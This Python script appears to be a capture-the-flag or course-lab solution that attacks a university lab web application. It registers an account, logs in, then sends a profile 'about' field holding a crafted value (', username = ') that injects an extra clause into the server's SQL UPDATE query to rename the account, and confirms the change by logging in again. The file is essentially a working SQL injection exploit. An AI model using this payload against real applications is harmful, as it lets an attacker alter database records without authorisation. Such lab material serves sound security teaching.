import requests, random

Server = 'http://a40ff75cdce02380039a825884964b5e117af09561845c13679abcb87fe4.project.ssof.rnl.tecnico.ulisboa.pt'
session = requests.session()

#Create a fresh user
salt = str(random.randint(2 ** 27, 2 ** 28))
user = "test" + salt
password = "123"
newusername = "hacked" + salt

params = {'password': password, 'username': user}
r = session.post(Server + '/register', data=params)

#Login with created account
params = {'username' : user, 'password' : password }
r = session.post(Server + '/login', data=params, cookies = session.cookies)

#Update Profile form
headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}
params = {}
r = requests.get(Server + '/profile', params=params, headers=headers, cookies = session.cookies)

#Update username to new username
files = {'photo': '(binary)'}
params = {'name': newusername, 'currentpassword': password, 'newpassword': password, 'about': "', username = '" + newusername  }
r = session.post(Server + '/update_profile', files = files , data = params, cookies = session.cookies)

#Relogin with the new username
params = {'username' : newusername, 'password' : password }
r = session.post(Server + '/login', data=params)

assert "Welcome" in r.text
print('Login was successful')

